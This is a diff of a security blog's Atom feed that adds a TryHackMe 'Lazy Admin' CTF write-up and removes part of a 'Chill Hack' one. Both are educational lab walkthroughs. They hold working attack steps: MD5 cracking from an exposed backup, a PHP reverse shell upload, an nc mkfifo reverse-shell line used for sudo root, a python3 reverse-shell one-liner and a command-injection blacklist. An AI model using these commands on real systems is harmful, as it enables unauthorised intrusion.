@@ -1,4 +1,178 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-03-21T16:39:53+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Daily Bugle Write Up</title><link href="https://darrynbrownfield.co.uk/dailybugle" rel="alternate" type="text/html" title="Daily Bugle Write Up" /><published>2021-03-21T00:00:00+00:00</published><updated>2021-03-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/dailybugle</id><content type="html" xml:base="https://darrynbrownfield.co.uk/dailybugle">&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-05-05T16:50:30+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Lazy Admin Write Up</title><link href="https://darrynbrownfield.co.uk/lazyadmin" rel="alternate" type="text/html" title="Lazy Admin Write Up" /><published>2021-05-05T00:00:00+00:00</published><updated>2021-05-05T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/lazyadmin</id><content type="html" xml:base="https://darrynbrownfield.co.uk/lazyadmin">&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/lazyadmin&quot;&gt;lazyadmin&lt;/a&gt; is a fun easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.86.223. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.86.223
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-05 16:22 BST
+Nmap scan report for 10.10.86.223
+Host is up (0.028s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - OpenSSH 7.2p2 Ubuntu&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Opening the webpage just provides a default apache page, I checked the source code and tried robots.txt but didn’t find anything so ran a gobuster. Straight away I got a hit for ‘/content’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223 -t 75 -o gobuster.log
+===============================================================                                                                
+Gobuster v3.0.1                                                                                                                
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)                                                                
+===============================================================
+[+] Url:            http://10.10.86.223
+[+] Threads:        75
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/05/05 16:26:03 Starting gobuster
+===============================================================
+/content (Status: 301)
+[SNIP]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Navigating to ‘http://10.10.86.223/content’ appears to be another default page but this time revealing the server is running SweetRice CMS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I ran a gobuster in the background while clicking around. I didnt find anything of interest, however gobuster found a few directories to review.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.86.223/content/ -t 75 -o gobuster-sweetrice.log
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.86.223/content/
+[+] Threads:        75
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/05/05 16:33:33 Starting gobuster
+===============================================================
+/images (Status: 301)
+/js (Status: 301)
+/inc (Status: 301)
+/as (Status: 301)
+/_themes (Status: 301)
+/attachment (Status: 301)
+===============================================================
+2021/05/05 16:35:02 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;‘http://10.10.86.223/content/as’ took me to a login page, I tried some default credentials but couldnt log in. Looking around the folders ‘/inc/mysql_backup/’ looks interesting and in the folder is a single backup file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/mysql.png&quot; alt=&quot;mysql&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file is readable with cat, looking through I found a user account and password hash. Using the tool ‘hash-identifier’ the hash is md5. Because its md5 I used &lt;a href=&quot;https://crackstation.net&quot;&gt;crackstation&lt;/a&gt; rather than hashcat and got a hit.&lt;/p&gt;
+
+&lt;p&gt;Using the credentials from the mysql backup file and the cracked password I was able to login to ‘http://10.10.86.223/content/as’&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/sweetrice.png&quot; alt=&quot;sweetrice&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;Once logged in, I could clearly see the SweetRice version of 1.5.1, googling ‘sweetrice 1.5.1 exploit’ I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40716&quot;&gt;exploit&lt;/a&gt; using the upload feature. The exploit is just a simple python script doing a POST call to ‘/as/?type=media_center&amp;amp;mode=upload’.&lt;/p&gt;
+
+&lt;p&gt;Rather than use the exploit code I navigated to the ‘Media Center’ part of the website so I could upload a file.&lt;/p&gt;
+
+&lt;p&gt;I copied a php reverse shell from /usr/share/webshells/php from my ParrotOS and renamed to shell.php and updated the IP and port details.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/lazyadmin/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, shell.php didn’t work, I didn’t get an error it just didn’t upload, I renamed to shell.php5 and tried to upload again and it worked. I clicked the uploaded file and got a shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [SNIP] from (UNKNOWN) [10.10.86.223] 38212
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 18:52:05 up 33 min,  0 users,  load average: 0.00, 0.00, 0.06
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;The first thing I checked was sudo -l and found the www-data was able to run a perl script as sudo with no password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I checked the script permissions and I was not able to edit the script however I could read it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ ls -lah /home/itguy/backup.pl
+-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I stabilised my shell using python and started reviewing the script. It looks like the script calls another script so I again checked the permissions and I can edit this file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
+#!/usr/bin/perl
+
+system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
+www-data@THM-Chal:/home/itguy$
+www-data@THM-Chal:/home/itguy$ ls -lah /etc/copy.sh
+-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+www-data@THM-Chal:/home/itguy$
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.0.190 5554 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The /etc/copy.sh script has a nc reverse shell payload, I replaced the command with my own IP and port details  and ran the perl script as sudo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@THM-Chal:/home/itguy$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc IP 5555 &amp;gt;/tmp/f&quot; &amp;gt; /etc/copy.sh
+www-data@THM-Chal:/home/itguy$
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Root shell!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [SNIP] from (UNKNOWN) [10.10.86.223] 49536
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Daily Bugle Write Up</title><link href="https://darrynbrownfield.co.uk/dailybugle" rel="alternate" type="text/html" title="Daily Bugle Write Up" /><published>2021-03-21T00:00:00+00:00</published><updated>2021-03-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/dailybugle</id><content type="html" xml:base="https://darrynbrownfield.co.uk/dailybugle">&lt;p&gt;&lt;img src=&quot;/assets/images/dailybugle/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
@@ -2450,406 +2624,4 @@ uid=0(root) gid=0(root) groups=0(root)
 root@ubuntu:/home/nyan# 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Chill Hack Write Up</title><link href="https://darrynbrownfield.co.uk/chillhack" rel="alternate" type="text/html" title="Chill Hack Write Up" /><published>2020-12-05T00:00:00+00:00</published><updated>2020-12-05T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/chillhack</id><content type="html" xml:base="https://darrynbrownfield.co.uk/chillhack">&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/cover.png&quot; alt=&quot;Chillhack&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/chillhack&quot;&gt;Chillhack&lt;/a&gt; is a great boot2root machine from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. Credit to &lt;a href=&quot;https://twitter.com/acharya_anurodh&quot;&gt;Anurodh&lt;/a&gt; for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root.  We have two tasks to complete, obtain the user and root flags.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.226.46
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-05 11:06 GMT
-Nmap scan report for 10.10.226.46
-Host is up (0.028s latency).
-Not shown: 997 closed ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to 
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
-|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
-|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Game Info
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;21 - FTP - Anonymous login allowed with a note.txt file&lt;/li&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.29&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;First I had a look at the note on the FTP server. I logged in with the anonymous account and downloaded the file. The note reads:&lt;/p&gt;
-
-&lt;p&gt;“Anurodh told me that there is some filtering on strings being put in the command – Apaar”&lt;/p&gt;
-
-&lt;p&gt;No idea what this is related to yet so I started to look at the web server. I kicked off a gobuster while I had a click around the webpages.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.226.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.226.46
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/12/05 11:12:39 Starting gobuster
-===============================================================
-/images (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/fonts (Status: 301)
-/secret (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2020/12/05 11:14:34 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Clicking around didnt reveal much however the gobuster found the directory /secret&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This must be what the note is refering to. I started with some basics commands to see what was possible such as whoami, pwd, date which were all successful and returned a response.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/wwwdata.png&quot; alt=&quot;wwwdata&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;However when I tried ls or ‘cat /etc/passwd’ I got an alert! However I didn’t get blocked so I could keep testing commands.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/hacker.png&quot; alt=&quot;hacker&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;Based on the recon so far I was confident my foothold would be via the /secret directory and bypassing the command filter I might be able to either get a SSH key or reverse shell.&lt;/p&gt;
-
-&lt;p&gt;I tried testing various commands and found I was able to bypass the filter using quotes. When I tried to run ‘ls’ before it failed however when I put the command in quotes I get a response.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/lsworked.png&quot; alt=&quot;lsworked&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I started a netcat listener on my attacker VM I tried a couple of reverse shell one liners but finally got success with python3.&lt;/p&gt;
-
-&lt;p&gt;`python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ATTACK VM”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [ATTACK VM] from (UNKNOWN) [10.10.226.46] 45160
-/bin/sh: 0: can't access tty; job control turned off
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We have a shell! Looking at index.php shows the blacklist.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;html&amp;gt;                                                                                                                             
-&amp;lt;body&amp;gt;                                                                                                                             
-                                                                                                                                   
-&amp;lt;form method=&quot;POST&quot;&amp;gt;                                                                                                               
-        &amp;lt;input id=&quot;comm&quot; type=&quot;text&quot; name=&quot;command&quot; placeholder=&quot;Command&quot;&amp;gt;                                                         
-        &amp;lt;button&amp;gt;Execute&amp;lt;/button&amp;gt;                                                                                                   
-&amp;lt;/form&amp;gt;                                                                                                                            
-&amp;lt;?php                                                                                                                              
-        if(isset($_POST['command']))                                                                                               
-        {
-                $cmd = $_POST['command'];
-                $store = explode(&quot; &quot;,$cmd);
-                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
-                for($i=0; $i&amp;lt;count($store); $i++)
-                {
-                        for($j=0; $j&amp;lt;count($blacklist); $j++)
-                        {
-                                if($store[$i] == $blacklist[$j])
-                                {?&amp;gt;
-                                        &amp;lt;h1 style=&quot;color:red;&quot;&amp;gt;Are you a hacker?&amp;lt;/h1&amp;gt;
-                                        &amp;lt;style&amp;gt;
-                                                body
-                                                {
-                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
-                                                        background-position: center center;
-                                                        background-repeat: no-repeat;
-                                                        background-attachment: fixed;
-                                                        background-size: cover;
-        }
-                                        &amp;lt;/style&amp;gt;
-&amp;lt;?php                                    return;
-                                }
-                        }
-                }
-                ?&amp;gt;&amp;lt;h2 style=&quot;color:blue;&quot;&amp;gt;&amp;lt;?php echo shell_exec($cmd);?&amp;gt;&amp;lt;/h2&amp;gt;
-                        &amp;lt;style&amp;gt;
-                             body
-                             {
-                                   background-image: url('images/blue_boy_typing_nothought.gif');  
-                                   background-position: center center;
-                                   background-repeat: no-repeat;
-                                   background-attachment: fixed;
-                                   background-size: cover;
-}
-                          &amp;lt;/style&amp;gt;
-        &amp;lt;?php }
-?&amp;gt;
-&amp;lt;/body&amp;gt;
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I can see 3 users ‘aurick’, ‘apaar’ and ‘anurodh’ however I could only access apaar’s directory but couldn’t read any files. I went back to /var/www to enumerate further and found the directory ‘files’. Looking at index.php I found a mysql username and password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mysql -u root -p
-mysql -u root -p
-Enter password: 
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 6
-Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
-
-Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql&amp;gt; show databases;                                            
-show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-| sys                |
-| webportal          |
-+--------------------+
-5 rows in set (0.00 sec)
-
-mysql&amp;gt; use webportal;
-use webportal;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql&amp;gt; show tables;
-show tables;
-+---------------------+
-| Tables_in_webportal |
-+---------------------+
-| users               |
-+---------------------+
-1 row in set (0.00 sec)
-
-mysql&amp;gt; select * from users;
-select * from users;
-+----+-----------+----------+-----------+----------------------------------+
-| id | firstname | lastname | username  | password                         |
-+----+-----------+----------+-----------+----------------------------------+
-|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de2REDACTED      |
-|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df05REDACTED      |
-+----+-----------+----------+-----------+----------------------------------+
-2 rows in set (0.00 sec)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Found some users, the passwords look like md5 hashes so I created a file on my attack VM with both hashes in and then ran hashcat to crack them.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --force                                         
-hashcat (v5.1.0) starting...                                                                               
-                                                                                                           
-OpenCL Platform #1: The pocl project                                                                       
-====================================                                                                       
-* Device #1: pthread-Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz, 512/1472 MB allocatable, 2MCU                
-                                                                                                           
-Hashes: 2 digests; 2 unique digests, 1 unique salts                                                        
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                               
-Rules: 1                                                                                                   
-                                                                                                           
-Applicable optimizers:                                                                                     
-* Zero-Byte                                                                                                
-* Early-Skip                                                                                               
-* Not-Salted                                                                                               
-* Not-Iterated                                                                                             
-* Single-Salt                                                                                              
-* Raw-Hash                                                                                                 
-                                                                                                           
-Minimum password length supported by kernel: 0                                                             
-Maximum password length supported by kernel: 256                                                           
-                                                                                                           
-ATTENTION! Pure (unoptimized) OpenCL kernels selected.                                                     
-This enables cracking passwords and salts &amp;gt; length 32 but for the price of drastically reduced performance.
-If you want to switch to optimized OpenCL kernels, append -O to your commandline.
-
-Watchdog: Hardware monitoring interface not found on your system.
-Watchdog: Temperature abort trigger disabled.
-
-Dictionary cache built:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344392
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-* Runtime...: 2 secs
-
-686216240e5af30df05REDACTED:&amp;lt;hidden&amp;gt;
-7e53614ced3640d5de2REDACTED:&amp;lt;hidden&amp;gt;  
-                                                 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Type........: MD5
-Hash.Target......: hashes
-Time.Started.....: Sat Dec  5 12:08:01 2020 (3 secs)
-Time.Estimated...: Sat Dec  5 12:08:04 2020 (0 secs)
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:  2713.5 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
-Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
-Progress.........: 5736448/14344385 (39.99%)
-Rejected.........: 0/5736448 (0.00%)
-Restore.Point....: 5734400/14344385 (39.98%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidates.#1....: maston420 -&amp;gt; masta619
-
-Started: Sat Dec  5 12:07:49 2020
-Stopped: Sat Dec  5 12:08:05 2020
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Both hashes successfully cracked. I tried to use them to log in via SSH but that didn’t work. I went back to the /var/www/files directory to have a look at what was going on. When a user successfully logged in they were directed to hacker.php. Looking at the hacker.php the following code looked interesting:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;center&amp;gt;
-        &amp;lt;img src = &quot;images/hacker-with-laptop_23-2147985341.jpg&quot;&amp;gt;&amp;lt;br&amp;gt;
-        &amp;lt;h1 style=&quot;background-color:red;&quot;&amp;gt;You have reached this far. &amp;lt;/h2&amp;gt;
-        &amp;lt;h1 style=&quot;background-color:black;&quot;&amp;gt;Look in the dark! You will find your answer&amp;lt;/h1&amp;gt;
-&amp;lt;/center&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;My initial thought was steganography in the hacker image, there are lots of ways I could have copied the images to my attack machine however I could see the webpage was being hosted locally on port 9001 so I used SSH to tunnel the port so I could access the webpage.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ netstat -ntlp                                                                                 
-netstat -ntlp                                                                                   
-(Not all processes could be identified, non-owned process info                                  
- will not be shown, you would have to be root to see it all.)                                   
-Active Internet connections (only servers)                                                      
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
-tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -               
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -               
-tcp6       0      0 :::22                   :::*                    LISTEN      -               
-tcp6       0      0 :::80                   :::*                    LISTEN      -               
-tcp6       0      0 :::21                   :::*                    LISTEN      -               
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On the ‘victim’ machine I issued the command ‘ssh -N -R ATTACKERVMIP:9001:127.0.0.1:9001 daz@ATTACKERVMIP’. Now on my attack VM I could web browse to 127.0.0.1:9001 and get access to the login page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I logged in with aurick credentials.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/chillhack/9001.png&quot; alt=&quot;9001&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now its simple to just right click and download the hacker image to my machine.  Now the image in on my machine and check for any hidden files.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $steghide extract -sf hacker-with-laptop_23-2147985341.jpg
-Enter passphrase:                                              
-wrote extracted data to &quot;backup.zip&quot;.                          
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Using steghide I was able to extract a zip file. However the zip file was password protected.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/usr/sbin/zip2john backup.zip &amp;gt; ziphash
